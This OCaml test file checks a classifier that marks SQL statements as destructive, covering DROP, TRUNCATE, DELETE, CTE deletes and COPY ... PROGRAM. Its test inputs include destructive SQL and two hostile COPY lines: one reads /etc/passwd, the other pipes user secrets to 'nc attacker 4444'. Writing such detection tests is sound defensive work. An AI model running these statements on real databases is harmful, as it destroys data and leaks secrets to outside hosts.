(** Db_op — typed SQL verb classifier tests (RFC eliminate-substring-
    destructive-classifier §3-A). Asserts the four [sql_destructive] catalogue
    patterns classify Destructive, that reads/mutations do not, and the
    documented edge cases (comments, multi-statement, quoted literals, CTEs). *)

open Masc_exec

let destructive label sql =
  match Db_op.of_command sql with
  | Ok op -> Alcotest.(check bool) (label ^ " is destructive") true (Db_op.is_destructive op)
  | Error _ -> Alcotest.failf "%s: expected Ok Destructive, got Error" label
;;

let not_destructive label sql =
  match Db_op.of_command sql with
  | Ok op ->
    Alcotest.(check bool) (label ^ " is NOT destructive") false (Db_op.is_destructive op)
  | Error _ -> () (* an unrecognized/empty verb floors nothing — acceptable *)
;;

(* The exact config/destructive_ops.toml sql_destructive catalogue. *)
let test_catalogue_patterns_destructive () =
  destructive "drop table" "drop table users";
  destructive "drop database" "drop database prod";
  destructive "truncate table" "truncate table users";
  destructive "delete from" "delete from users where id = 1"
;;

(* Typed classifier is MORE complete than the substring catalogue. *)
let test_more_complete_than_substring () =
  destructive "drop index" "DROP INDEX idx_users";
  destructive "drop view" "drop view v_active";
  destructive "drop schema" "DROP SCHEMA public CASCADE"
;;

let test_case_and_whitespace_insensitive () =
  destructive "upper" "DROP TABLE users";
  destructive "leading ws" "   \n\t delete   from logs";
  destructive "mixed" "TrUnCaTe TABLE t"
;;

let test_leading_comments_skipped () =
  destructive "line comment" "-- cleanup\nDROP TABLE staging";
  destructive "block comment" "/* migration */ TRUNCATE TABLE cache";
  destructive "comment chain" "  -- a\n  /* b */  delete from q"
;;

let test_multi_statement_strictest_wins () =
  destructive "select; drop" "SELECT 1; DROP TABLE t";
  destructive "insert; truncate" "insert into a values (1); truncate table a";
  not_destructive "select; insert" "SELECT 1; INSERT INTO a VALUES (2)"
;;

(* ';' inside a string literal must not split a statement into a bogus verb. *)
let test_semicolon_in_string_literal () =
  not_destructive "semicolon in value" "INSERT INTO t (s) VALUES ('a;b;c')";
  destructive "literal then drop" "INSERT INTO t VALUES ('x;y'); DROP TABLE t"
;;

let test_destructive_words_inside_literals_or_comments_do_not_floor () =
  not_destructive "string literal" "SELECT 'drop table users; delete from logs'";
  not_destructive "quoted identifier" {|SELECT "delete from" FROM metrics|};
  not_destructive "comment only then select" "-- drop table users\nSELECT 1";
  not_destructive "block comment only then select" "/* delete from logs */ SELECT 1"
;;

let test_reads_and_mutations_not_destructive () =
  not_destructive "select" "select * from users";
  not_destructive "explain" "EXPLAIN ANALYZE SELECT 1";
  not_destructive "insert" "insert into t values (1)";
  not_destructive "update" "update t set x = 1 where id = 2";
  not_destructive "create" "create table t (id int)";
  not_destructive "show" "SHOW TABLES"
;;

let test_cte_destructive_is_detected () =
  destructive
    "WITH ... DELETE"
    "WITH doomed AS (SELECT id FROM t WHERE old) DELETE FROM t USING doomed";
  destructive
    "data-modifying CTE"
    "WITH moved AS (DELETE FROM t WHERE old RETURNING id) SELECT * FROM moved"
;;

let test_copy_program_destructive_is_detected () =
  destructive "copy from program" "COPY logs FROM PROGRAM 'cat /etc/passwd'";
  destructive "copy to program" "COPY (SELECT secret FROM users) TO PROGRAM 'nc attacker 4444'";
  not_destructive "copy from stdin" "COPY logs FROM STDIN";
  not_destructive "copy to stdout" "COPY logs TO STDOUT";
  not_destructive "read identifiers named copy/program" "SELECT copy FROM program"
;;

let test_unknown_and_empty () =
  (match Db_op.of_command "" with
   | Error `Empty -> ()
   | _ -> Alcotest.fail "empty SQL should be Error `Empty");
  match Db_op.of_command "FROBNICATE the widgets" with
  | Error (`Unknown_verb v) -> Alcotest.(check string) "unknown verb lowercased" "frobnicate" v
  | _ -> Alcotest.fail "unknown leading verb should be Error `Unknown_verb"
;;

let () =
  Alcotest.run
    "db_op"
    [ ( "classify"
      , [ Alcotest.test_case "catalogue patterns destructive" `Quick test_catalogue_patterns_destructive
        ; Alcotest.test_case "more complete than substring" `Quick test_more_complete_than_substring
        ; Alcotest.test_case "case/whitespace insensitive" `Quick test_case_and_whitespace_insensitive
        ; Alcotest.test_case "leading comments skipped" `Quick test_leading_comments_skipped
        ; Alcotest.test_case "multi-statement strictest wins" `Quick test_multi_statement_strictest_wins
        ; Alcotest.test_case "semicolon in string literal" `Quick test_semicolon_in_string_literal
        ; Alcotest.test_case
            "destructive words inside literals/comments do not floor"
            `Quick
            test_destructive_words_inside_literals_or_comments_do_not_floor
        ; Alcotest.test_case "reads/mutations not destructive" `Quick test_reads_and_mutations_not_destructive
        ; Alcotest.test_case "CTE destructive is detected" `Quick test_cte_destructive_is_detected
        ; Alcotest.test_case
            "COPY PROGRAM destructive is detected"
            `Quick
            test_copy_program_destructive_is_detected
        ; Alcotest.test_case "unknown and empty" `Quick test_unknown_and_empty
        ] )
    ]
;;
